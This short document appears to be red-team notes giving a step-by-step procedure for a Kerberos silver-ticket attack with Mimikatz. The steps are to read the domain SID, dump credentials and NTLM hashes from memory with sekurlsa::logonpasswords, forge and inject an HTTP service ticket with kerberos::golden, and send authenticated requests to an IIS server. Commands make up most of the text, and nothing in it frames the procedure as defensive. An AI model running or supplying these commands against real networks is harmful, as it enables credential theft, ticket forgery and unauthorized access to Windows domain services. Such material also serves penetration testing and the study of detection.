We can use Mimikatz to dump hashes and craft a ticket for services access.

First we take the DOMAIN SID with

```powershell
whoami /user
```

We extract the domain

```adblock
corp\user **S-1-5-21-xxxxxxxx-xxxxxxx-xxxxxxxx**-xxxx
```

Then with Mimikatz we dump service hashes

```powershell
privilege::debug
sekurlsa::logonpasswords
```

Here we take the NTLM HASH of the service, for example the `iss_service`. Next we can run the attack inside Mimikatz. In the following case we will target the ISS Microsoft service.

```powershell
kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:http /rc4:<HASH> /user:<USER>
```

Now we can dump our tickets with

```powershell
klist
```

The ticket will be crated for the admin user and for the local user. We can craft authenticated request to the ISS server.

```powershell
iwr -UseDefaultCredentials <URL>
```
